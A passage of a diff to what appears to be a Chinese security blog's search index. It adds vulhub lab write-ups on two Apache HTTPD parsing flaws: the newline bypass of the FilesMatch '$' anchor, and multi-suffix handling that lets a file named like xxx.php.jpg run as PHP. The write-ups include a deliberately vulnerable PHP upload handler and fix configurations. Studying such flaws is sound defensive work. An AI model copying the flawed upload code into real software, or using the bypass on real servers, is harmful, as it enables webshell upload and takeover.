docker exec -it &lt;容器&gt; 命令  /bin/bash</span><br><span class="line">cd到目录下</span><br><span class="line">cd /etc/apache2/conf-available/</span><br><span class="line">查看文件</span><br><span class="line">cat docker-php.conf</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906203611056.png" alt="image-20230906203611056"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">        SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;Directory /var/www/&gt;</span><br><span class="line">        Options -Indexes</span><br><span class="line">        AllowOverride All</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\ .php$ 中的$ 表示配置匹配后缀名文件的防盗链,而这个解析漏洞根本原因就是$ 这个符号，这个符号在正则表达式中是匹配字符串中结尾的位置，也就是说可以利用换行符使$ 与其匹配从而绕过黑名单机制实现文件上传，验证逻辑又是先会对上传的文件正则匹配验证后缀名是否包含了php,因为解析漏洞的存在，这里不会过滤php%0a,后续的黑名单机制也就如同摆设了</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1、使用SetHandler,写好正则</p><p>2、禁止.php这样的文件执行</p><p>3、升级版本</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Apache_HTTPD_多后缀解析漏洞</title>
+      <link href="/2022/12/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-HTTPD-%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2022/12/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache-HTTPD-%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><strong>httpd是Apache超文本传输协议(HTTP)服务器的主程序。被设计为一个独立运行的后台进程，它会建立一个处理请求的子进程或线程的池。</strong></p><p>该漏洞并不是apache程序本身的问题，而是管理员配置不当造成。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见的媒体格式类型解释：</span><br><span class="line"></span><br><span class="line">text/html： HTML格式</span><br><span class="line"></span><br><span class="line">text/plain：纯文本格式</span><br><span class="line"></span><br><span class="line">image/gif：gif图片格式</span><br><span class="line"></span><br><span class="line">application/pdf：pdf格式</span><br><span class="line"></span><br><span class="line">application/octet-stream：二进制流数据(常见的文件下载就是这种媒体格式)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906173408619.png" alt="image-20230906173408619"></p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境运行后，访问http://10.9.75.198/uploadfiles/apache.php.jpeg即可发现，phpinfo被执行了，该文件被解析为php脚本。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906174117330.png" alt="image-20230906174117330"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230906173518386.png" alt="image-20230906173518386"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看源码，发现是一个基于白名单检测文件后缀的页面，但上传后并未重命名。</span><br><span class="line">可以通过上传文件名为xxx.php.jpg，利用Apache解析漏洞进行getshell。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES)):</span><br><span class="line"></span><br><span class="line">$ext = pathinfo($_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">if (!in_array($ext, [&#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;])) &#123;</span><br><span class="line">    die(&#x27;Unsupported filetype uploaded.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$new_name = __DIR__ . &#x27;/uploadfiles/&#x27; . $_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;];</span><br><span class="line">if(!move_uploaded_file($_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;], $new_name))&#123;</span><br><span class="line">    die(&#x27;Error uploading file - check destination is writeable.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die(&#x27;File uploaded successfully: &#x27; . $new_name);</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    File: &lt;input type=&quot;file&quot; name=&quot;file_upload&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">endif;  </span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1.使用 SetHandler，写好正则</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FileMatch <span class="string">&quot;.+\.php$&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><p>2、禁止 .php 这样的文件执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FileMatch <span class="string">&quot;.+\.ph(p[3457]?|t|tml)\.&quot;</span>&gt;</span><br><span class="line">Require all denied</span><br><span class="line">&lt;/FileMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>fastjson-1.2.24-反序列化导致任意命令执行漏洞</title>
       <link href="/2022/12/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
       <url>/2022/12/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
